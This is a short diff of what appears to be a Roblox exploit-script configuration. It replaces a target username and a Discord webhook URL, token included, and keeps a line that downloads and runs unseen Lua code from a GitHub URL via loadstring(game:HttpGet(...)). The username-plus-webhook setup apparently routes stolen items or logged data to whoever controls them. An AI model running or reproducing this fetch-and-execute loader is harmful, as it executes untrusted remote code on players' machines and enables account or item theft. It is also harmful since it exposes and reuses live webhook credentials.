@@ -1,3 +1,3 @@
-Username = "Miguelmitodoroblo"
-Webhook = "https://discord.com/api/webhooks/1288544098168602655/gOM-9UDSNpzpQKP0C7rReE2BYBHFB8ecq5HavzG-cUASabdDrcqiF0A6xPZXT4c11_1j"
+Username = "Slay_OZ1"
+Webhook = "https://discord.com/api/webhooks/1284813684312637501/tvGV413EYbs33-RH3an21postOq5eVZ2y1a_KBcis6Y3Ehm2D9VoWpFIe6pie2OfJfXR"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dosiobodydoedy/x/main/bf.lua", true))()
